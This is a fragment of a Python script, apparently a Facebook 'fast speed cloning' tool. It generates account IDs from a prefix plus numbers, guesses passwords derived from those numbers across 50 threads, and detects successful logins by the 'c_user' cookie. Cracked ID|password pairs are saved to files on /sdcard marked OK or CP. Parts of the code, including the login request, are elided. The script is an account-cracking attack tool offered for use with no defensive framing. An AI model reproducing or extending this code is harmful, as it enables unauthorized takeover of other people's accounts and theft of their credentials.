...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95m 𝐅𝐚𝐬𝐭 𝐒𝐩𝐞𝐞𝐝 𝐂𝐥𝐨𝐧𝐢𝐧𝐠')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/𝐁𝐈𝐒𝐇𝐀𝐋-𝐎𝐊.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/𝐁𝐈𝐒𝐇𝐀𝐋-𝐂𝐏.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}𝐁𝐈𝐒𝐇𝐀𝐋{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
